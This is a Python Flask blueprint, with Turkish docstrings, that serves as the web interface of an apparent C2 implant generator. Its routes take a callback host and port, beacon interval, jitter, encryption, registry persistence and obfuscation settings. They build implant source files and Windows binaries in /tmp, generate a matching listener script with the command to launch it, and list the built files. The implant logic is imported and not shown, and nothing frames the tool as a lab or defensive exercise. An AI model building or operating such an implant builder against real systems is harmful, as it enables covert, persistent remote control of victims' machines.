from flask import Blueprint, render_template, request, jsonify, redirect, session

from cybermodules.c2_implant import C2ImplantGenerator, ImplantConfig, generate_c2_from_session

c2_bp = Blueprint("c2", __name__)


@c2_bp.route("/c2")
def c2_dashboard():
    """C2 Implant Generator ana sayfası"""
    if not session.get("logged_in"):
        return redirect("/login")
    return render_template("c2_implant.html")


@c2_bp.route("/c2/generate", methods=["POST"])
def generate_implant():
    """C2 implant üret"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    try:
        config = ImplantConfig(
            implant_name=data.get("name", "implant"),
            lhost=data.get("lhost", "192.168.1.100"),
            lport=int(data.get("lport", 4444)),
            interval=int(data.get("interval", 30)),
            jitter=int(data.get("jitter", 5)),
            encryption=data.get("encryption", "aes256"),
            persistence=data.get("persistence", "registry"),
            obfuscate=data.get("obfuscate", False),
            output_path=data.get("output_path", "/tmp")
        )
        
        generator = C2ImplantGenerator()
        result = generator.create_full_implant(config)
        
        return jsonify({
            "success": result.success,
            "source_file": result.source_file,
            "binary_file": result.binary_file,
            "command": result.command,
            "error": result.error
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        })


@c2_bp.route("/c2/generate-full", methods=["POST"])
def generate_full_implant():
    """Session'dan tam implant üret"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    try:
        session_data = {
            "name": data.get("name", "implant"),
            "lhost": data.get("lhost", "192.168.1.100"),
            "lport": int(data.get("lport", 4444)),
            "interval": int(data.get("interval", 30)),
            "jitter": int(data.get("jitter", 5)),
            "encryption": data.get("encryption", "aes256"),
            "persistence": data.get("persistence", "registry"),
            "obfuscate": data.get("obfuscate", False)
        }
        
        result = generate_c2_from_session(session_data, "/tmp")
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        })


@c2_bp.route("/c2/listener", methods=["POST"])
def create_listener():
    """C2 listener scripti oluştur"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    try:
        lhost = data.get("lhost", "0.0.0.0")
        lport = int(data.get("lport", 4444))
        
        generator = C2ImplantGenerator()
        listener_path = generator.save_listener(lhost, lport, "/tmp")
        
        return jsonify({
            "success": True,
            "listener_file": listener_path,
            "command": f"python3 {listener_path}",
            "message": "Listener scripti oluşturuldu"
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        })


@c2_bp.route("/c2/templates")
def get_templates():
    """Mevcut template'leri listele"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    try:
        import os
        templates = []
        
        for f in os.listdir("/tmp"):
            if f.endswith(".go") or f.endswith(".exe") or f.startswith("c2_listener"):
                templates.append({
                    "name": f,
                    "path": f"/tmp/{f}",
                    "size": os.path.getsize(f"/tmp/{f}")
                })
        
        return jsonify({
            "success": True,
            "templates": templates
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        })
